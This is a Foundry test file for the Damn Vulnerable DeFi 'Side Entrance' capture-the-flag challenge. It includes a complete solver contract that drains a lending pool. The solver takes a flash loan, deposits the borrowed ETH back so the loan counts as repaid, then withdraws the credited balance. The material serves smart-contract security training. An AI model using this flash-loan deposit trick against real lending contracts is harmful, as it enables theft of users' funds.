// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        ChallengeSolver solver = new ChallengeSolver(pool, recovery);
        solver.run();
        solver.withdraw();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

contract ChallengeSolver {
    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    address recoveryAddress;
    SideEntranceLenderPool lenderPool;

    constructor(SideEntranceLenderPool pool, address recovery) {
        lenderPool = pool;
        recoveryAddress = recovery;
    }

    // needed to be able to receive eth during flashLoan and withdraw calls
    receive() external payable {}

    // user calls run to initiate flashloan
    function run() public {
        lenderPool.flashLoan(ETHER_IN_POOL);
    }

    // SideEntranceLenderPool flashLoan() function calls execute() on this contract
    // we deposit the Eth back into the lender pool to get a deposited balance of 1000 Eth and pay back our flash loan
    function execute() external payable {
        lenderPool.deposit{value: ETHER_IN_POOL}();
    }

    // separately, call withdraw which should pass since out deposited balance is now equal to the flash loan amount and send those funds to the recovery address
    function withdraw() public {
        lenderPool.withdraw();
        (bool success,) = recoveryAddress.call{value: ETHER_IN_POOL}("");
        success;
    }
}
